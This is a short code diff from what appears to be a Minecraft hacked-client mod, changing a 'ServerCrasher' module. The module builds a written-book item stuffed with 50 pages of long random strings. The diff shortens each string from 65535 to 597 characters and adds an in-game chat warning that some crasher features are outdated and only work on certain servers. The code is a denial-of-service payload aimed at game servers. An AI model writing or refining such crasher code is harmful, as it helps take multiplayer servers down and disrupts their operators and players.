@@ -47,11 +47,17 @@ public class ServerCrasher extends Module {
         ct.putString("title", new Random().nextInt() + "");
         net.minecraft.nbt.ListTag listTag = new ListTag();
         for (int p = 0; p < 50; p++) {
-            listTag.add(StringTag.of(RandomHelper.rndStr(65535)));
+            listTag.add(StringTag.of(RandomHelper.rndStr(597)));
         }
         ct.put("pages", listTag);
         is.setTag(ct);
         return is;
+    }
+
+    @Override
+    public void onEnable() {
+        ClientHelper.sendChat("Some of the features in the server crasher are a bit outdated and may only work on specific servers, be warned.");
+        super.onEnable();
     }
 
     @Override
